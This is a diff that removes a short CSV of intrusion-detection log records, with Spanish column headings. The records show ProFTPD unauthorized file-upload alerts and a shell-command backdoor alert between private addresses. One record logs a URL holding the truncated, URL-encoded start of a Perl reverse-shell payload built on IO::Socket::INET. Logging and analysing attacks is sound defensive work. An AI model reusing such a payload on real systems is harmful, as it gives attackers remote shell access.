@@ -1,5 +1,0 @@
-ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
-37700,548901,1,3,ProFTPD Unauthorized Remote File Upload Vulnerability,code-execution,tcp,192.168.1.3,192.168.2.2,vulnerability,
-38390,548901,2,5,ProFTPD Unauthorized Remote File Upload Vulnerability,code-execution,tcp,192.168.1.3,192.168.2.2,vulnerability,
-9999,548902,1,1,,N/A,tcp,192.168.1.3,192.168.2.2,url,"192.168.2.2/6QfoFmJ.php?hCWVQ=nohup%20perl%20-MIO%20-e%20'$p=fork;exit,if($p);foreach%20my%20$key(keys%20%ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new%20IO::Socket::INET(PeerAddr,"
-86533,548903,2,5,TCP Shell Command Detection,backdoor,tcp,192.168.2.2,192.168.1.3,spyware,
